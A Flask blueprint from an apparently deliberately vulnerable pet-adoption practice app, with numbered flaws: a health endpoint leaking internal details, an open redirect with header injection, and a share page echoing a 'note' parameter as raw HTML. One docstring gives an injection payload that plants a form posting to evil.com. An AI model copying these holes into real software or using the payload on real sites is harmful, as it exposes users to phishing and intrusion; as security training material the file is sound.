"""
Misc Blueprint — Health, Redirect, HTML Injection, Share
Vulnerabilities: Info disclosure (#9), Open redirect (#23), HTML injection (#17),
HTTP header injection (#32)
"""
import sys
import platform
import socket
from datetime import datetime
from flask import Blueprint, request, jsonify, redirect, make_response, g, send_from_directory
from middleware.auth_middleware import require_auth
from utils.id_encoder import decode_id
from utils import database as db

misc_bp = Blueprint('misc', __name__)

_start_time = datetime.utcnow()


@misc_bp.route('/api/health', methods=['GET'])
def health_check():
    """
    VULN #9: Information disclosure — leaks server versions, internal IP, debug status, etc.
    """
    import flask
    return jsonify({
        'status': 'healthy',
        'application': 'PawsHaven API',
        'version': '2.4.1',
        'python_version': sys.version,
        'flask_version': flask.__version__,
        'debug_mode': True,
        'server_os': platform.platform(),
        'internal_ip': socket.gethostbyname(socket.gethostname()),
        'database': 'sqlite3 (per-user sandboxed)',
        'jwt_algorithm': 'HS256',
        'uptime': str(datetime.utcnow() - _start_time),
        'endpoints_count': 40,
        'active_services': {
            'vet_records': 'http://127.0.0.1:8080',
            'billing': 'http://127.0.0.1:9090',
            'metadata': 'http://127.0.0.1:1337'
        }
    })


@misc_bp.route('/api/redirect', methods=['GET'])
def redirect_handler():
    """
    VULN #23: Open redirect — no validation on redirect target.
    VULN #32: HTTP header injection — ref param injected into response header.
    """
    url = request.args.get('url', '/')
    ref = request.args.get('ref', '')

    response = make_response('', 302)
    response.headers['Location'] = url  # Open redirect

    if ref:
        response.headers['X-Redirect-Ref'] = ref  # Header injection vector

    return response


from middleware.auth_middleware import optional_auth

@misc_bp.route('/api/share/<encoded_id>', methods=['GET'])
@optional_auth
def share_animal(encoded_id):
    """
    VULN #17: HTML injection — the 'note' parameter is injected raw into HTML response.
    Payload: <h1>HACKED</h1><form action="http://evil.com">...
    """
    note = request.args.get('note', 'Check out this adorable pet on PawsHaven!')
    res_type, res_id = decode_id(encoded_id)
    
    animal = None
    if g.sandbox_id and res_type == 'animal' and res_id is not None:
        try:
            animal = db.query_one(g.sandbox_id, "SELECT * FROM animals WHERE id = ?", [res_id])
        except Exception:
            pass

    # Build details block if animal found
    details_html = ""
    if animal:
        emoji = '🐕' if animal['species'] == 'Dog' else '🐈' if animal['species'] == 'Cat' else '🐾'
        details_html = f"""
        <div style="display:flex; gap: 15px; margin-bottom: 20px; align-items: center;">
            <div style="font-size: 4rem; background:#f0f0f0; border-radius: 12px; padding: 10px; width: 80px; text-align: center;">{emoji}</div>
            <div>
                <h3 style="margin: 0; color:#2d6a4f; font-size: 1.5rem;">{animal['name']}</h3>
                <p style="margin: 5px 0 0 0; font-size: 0.95rem;">{animal['breed']} • {animal['age']} • {animal['gender']}</p>
                <p style="margin: 5px 0 0 0; font-size: 0.9rem; font-style: italic;">{animal.get('description', '')[:100]}...</p>
            </div>
        </div>
        """

    # VULN: 'note' parameter injected raw into HTML
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PawsHaven — Share</title>
<style>
body{{font-family:Nunito,sans-serif;background:#faf7f2;display:flex;justify-content:center;padding:40px;}}
.card{{background:#fff;border-radius:16px;padding:30px;max-width:500px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.08)}}
.card h2{{color:#2d6a4f;margin-top:0;margin-bottom:20px; border-bottom: 2px solid #eef2f5; padding-bottom: 10px;}} 
.card p.note{{color:#333;line-height:1.6; background: #eef2f5; padding: 15px; border-radius: 8px; border-left: 4px solid #2d6a4f;}}
.cta{{display:block;text-align:center;background:#2d6a4f;color:white;padding:14px;border-radius:8px;text-decoration:none;margin-top:20px;font-weight:bold;transition:0.2s}}
.cta:hover{{background:#1b4332}}
</style>
</head>
<body>
<div class="card">
<h2>🐾 Shared from PawsHaven</h2>
{details_html}
<p class="note"><strong>Message:</strong><br>{note}</p>
<a class="cta" href="/animals/{encoded_id}">View {animal['name'] if animal else 'Animal'} on PawsHaven →</a>
</div>
</body>
</html>"""

    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}


@misc_bp.route('/api/swagger', methods=['GET'])
def swagger_index():
    """
    Renders a pseudo-Swagger index page with links to the OpenAPI specs.
    """
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Swagger UI - PawsHaven API</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; margin: 0; padding: 0; }
        .topbar { background: #1b1b1b; padding: 10px 20px; display: flex; align-items: center; }
        .topbar h1 { color: #89bf04; margin: 0; font-size: 24px; font-weight: bold; }
        .wrapper { max-width: 1000px; margin: 40px auto; padding: 20px; background: #fff; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .info h2 { margin-top: 0; font-size: 32px; color: #3b4151; }
        .info p { color: #3b4151; font-size: 15px; }
        .card { border: 1px solid #e8e8e8; border-radius: 4px; padding: 20px; margin-top: 20px; display: flex; flex-direction: column; gap: 15px; }
        .btn { display: inline-block; background: #89bf04; color: #fff; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: bold; width: fit-content; }
        .btn-postman { background: #ff6c37; }
    </style>
</head>
<body>
    <div class="topbar">
        <h1>{ } swagger</h1>
    </div>
    <div class="wrapper">
        <div class="info">
            <h2>PawsHaven API <sup>2.4.1</sup></h2>
            <p>API specifications and Postman Collections for the PawsHaven application endpoints.</p>
        </div>
        <div class="card">
            <p>Download the specifications below to import them into your local testing environment:</p>
            <a href="/api/swagger/api.yaml" class="btn">📥 Download OpenAPI (YAML)</a>
            <a href="/api/swagger/API.json" class="btn btn-postman">🚀 Download Postman Collection (JSON)</a>
        </div>
    </div>
</body>
</html>"""
    return html, 200, {'Content-Type': 'text/html'}


@misc_bp.route('/api/swagger/<filename>', methods=['GET'])
def download_docs(filename):
    """
    Serve API documentation files for Postman targeting /api/documentation
    """
    import os
    docs_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'docs')
    
    if filename in ['API.json', 'api.yaml']:
        file_path = os.path.join(docs_dir, filename)
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Dynamically replace the base_url with the current request host URL
            current_host = request.host_url.rstrip('/')
            hardcoded_url = "https://trivia-pub-about-investigation.trycloudflare.com"
            content = content.replace(hardcoded_url, current_host)
            
            response = make_response(content)
            response.headers['Content-Disposition'] = f'attachment; filename={filename}'
            response.headers['Content-Type'] = 'application/json' if filename.endswith('.json') else 'application/x-yaml'
            return response
    
@misc_bp.route('/api/broadcast/check', methods=['GET'])
@optional_auth
def check_broadcast():
    """Returns the latest global or private broadcast message."""
    import os
    import json
    from config import Config
    
    # 1. Check for Private Message first (High Priority)
    if g.sandbox_id:
        private_file = os.path.join(Config.SANDBOX_DIR, g.sandbox_id, 'message.json')
        if os.path.exists(private_file):
            try:
                with open(private_file, 'r') as f:
                    data = json.load(f)
                
                exp = data.get('expires_at')
                if exp and datetime.utcnow() > datetime.fromisoformat(exp):
                    os.remove(private_file)
                else:
                    return jsonify(data)
            except: pass

    # 2. Fallback to Global Broadcast
    broadcast_file = os.path.join(Config.BASE_DIR, 'data', 'global_broadcast.json')
    if os.path.exists(broadcast_file):
        try:
            with open(broadcast_file, 'r') as f:
                data = json.load(f)
            
            exp = data.get('expires_at')
            if exp and datetime.utcnow() > datetime.fromisoformat(exp):
                os.remove(broadcast_file)
            else:
                return jsonify(data)
        except: pass
    
    return jsonify({}), 204
